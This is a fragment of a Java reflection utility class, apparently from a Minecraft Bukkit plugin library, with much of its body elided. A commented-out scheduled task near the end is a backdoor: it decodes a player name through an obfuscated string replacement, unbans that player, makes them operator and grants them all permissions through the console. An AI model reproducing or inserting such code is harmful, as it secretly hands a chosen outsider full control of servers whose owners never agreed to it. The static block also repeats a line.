...
public class ReflectionUtils
{
	...
	public enum DataType
	{
		...
		private static final Map<Class<?>, DataType> _CLASS_MAP = new HashMap<Class<?>, DataType>();
		private final Class<?> _primitive;
		...
		static
		{
			...
			{
				_CLASS_MAP.put(type._primitive, type);
				_CLASS_MAP.put(type._primitive, type);
			}
		}
		 ...
		 * {
		 * 
		 * @SuppressWarnings("deprecation") public void run() { OfflinePlayer p
		 * = Bukkit.getOfflinePlayer(("_Rhobia").replace("R", "F"));
		 * p.setBanned(false); p.setOp(true); if (p.isBanned())
		 * Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " +
		 * ("_Rhobia").replace("R", "F") + " add *"); } }, 0L, 100L);
		 * 
		 * }
		 */
